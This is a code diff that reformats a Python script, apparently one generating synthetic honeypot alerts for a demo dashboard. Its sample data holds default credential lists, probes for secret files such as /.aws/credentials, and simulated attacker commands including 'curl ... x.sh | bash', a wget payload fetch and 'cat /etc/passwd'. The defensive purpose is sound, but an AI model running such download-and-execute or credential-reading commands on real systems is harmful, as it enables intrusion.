@@ -105,8 +105,30 @@ _EVENT_PROFILES: dict[str, list[tuple[str, str, int]]] = {
     ],
 }
 
-_USERNAMES = ["root", "admin", "user", "ubuntu", "test", "postgres", "oracle", "git", "deploy", "ec2-user"]
-_PASSWORDS = ["123456", "admin", "password", "root", "qwerty", "letmein", "P@ssw0rd!", "changeme", "toor", "12345"]
+_USERNAMES = [
+    "root",
+    "admin",
+    "user",
+    "ubuntu",
+    "test",
+    "postgres",
+    "oracle",
+    "git",
+    "deploy",
+    "ec2-user",
+]
+_PASSWORDS = [
+    "123456",
+    "admin",
+    "password",
+    "root",
+    "qwerty",
+    "letmein",
+    "P@ssw0rd!",
+    "changeme",
+    "toor",
+    "12345",
+]
 _SSH_BANNERS = [
     "SSH-2.0-libssh_0.9.6",
     "SSH-2.0-PUTTY",
@@ -116,9 +138,18 @@ _SSH_BANNERS = [
     "SSH-2.0-JSCH-0.1.55",
 ]
 _HTTP_PATHS = [
-    "/admin", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/",
-    "/manager/html", "/api/v1/users", "/.aws/credentials", "/config.json",
-    "/.docker/config.json", "/console/", "/server-status",
+    "/admin",
+    "/.env",
+    "/.git/config",
+    "/wp-login.php",
+    "/phpmyadmin/",
+    "/manager/html",
+    "/api/v1/users",
+    "/.aws/credentials",
+    "/config.json",
+    "/.docker/config.json",
+    "/console/",
+    "/server-status",
 ]
 
 
@@ -224,17 +255,14 @@ async def main() -> None:
     now = datetime.now(UTC)
     target_events = 5000
     events_per_engine = {
-        "ssh": int(target_events * 0.55),   # SSH is the loudest in real traffic
+        "ssh": int(target_events * 0.55),  # SSH is the loudest in real traffic
         "http": int(target_events * 0.20),
         "smtp": int(target_events * 0.05),
         "ftp": int(target_events * 0.05),
         "rdp": int(target_events * 0.15),
     }
 
-    print(
-        "Event budget by engine: "
-        + ", ".join(f"{k}={v}" for k, v in events_per_engine.items())
-    )
+    print("Event budget by engine: " + ", ".join(f"{k}={v}" for k, v in events_per_engine.items()))
 
     alerts_to_insert: list[Alert] = []
     for engine, count in events_per_engine.items():
@@ -244,9 +272,7 @@ async def main() -> None:
         hp_id = honeypot_ids[f"demo-{engine}"]
 
         for _ in range(count):
-            event_type, severity_str = random.choices(
-                event_choices, weights=event_weights, k=1
-            )[0]
+            event_type, severity_str = random.choices(event_choices, weights=event_weights, k=1)[0]
             attacker_ip, enrichment = random.choice(attackers)
 
             # Spread events across the last 24h, weighted toward more recent
@@ -300,11 +326,17 @@ def _build_payload(engine: str, event_type: str, attacker_ip: str) -> dict:
                 "src_ip": attacker_ip,
             }
         if "command" in event_type:
-            cmd = random.choice([
-                "uname -a", "cat /etc/passwd", "wget http://malicious.example/payload.sh",
-                "curl -fsSL http://203.0.113.45/x.sh | bash", "id", "uptime",
-                "/bin/busybox echo gayfgt; /bin/busybox MIRAI",
-            ])
+            cmd = random.choice(
+                [
+                    "uname -a",
+                    "cat /etc/passwd",
+                    "wget http://malicious.example/payload.sh",
+                    "curl -fsSL http://203.0.113.45/x.sh | bash",
+                    "id",
+                    "uptime",
+                    "/bin/busybox echo gayfgt; /bin/busybox MIRAI",
+                ]
+            )
             return {"input": cmd, "src_ip": attacker_ip}
         if "version" in event_type:
             return {"version": random.choice(_SSH_BANNERS), "src_ip": attacker_ip}
@@ -320,13 +352,15 @@ def _build_payload(engine: str, event_type: str, attacker_ip: str) -> dict:
         return {
             "path": random.choice(_HTTP_PATHS),
             "method": random.choice(["GET", "POST", "HEAD"]),
-            "user_agent": random.choice([
-                "Mozilla/5.0 (zgrab/0.x)",
-                "curl/7.68.0",
-                "python-requests/2.28.1",
-                "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
-                "Mozilla/5.0 (Windows NT 10.0)",
-            ]),
+            "user_agent": random.choice(
+                [
+                    "Mozilla/5.0 (zgrab/0.x)",
+                    "curl/7.68.0",
+                    "python-requests/2.28.1",
+                    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
+                    "Mozilla/5.0 (Windows NT 10.0)",
+                ]
+            ),
             "src_ip": attacker_ip,
         }
 
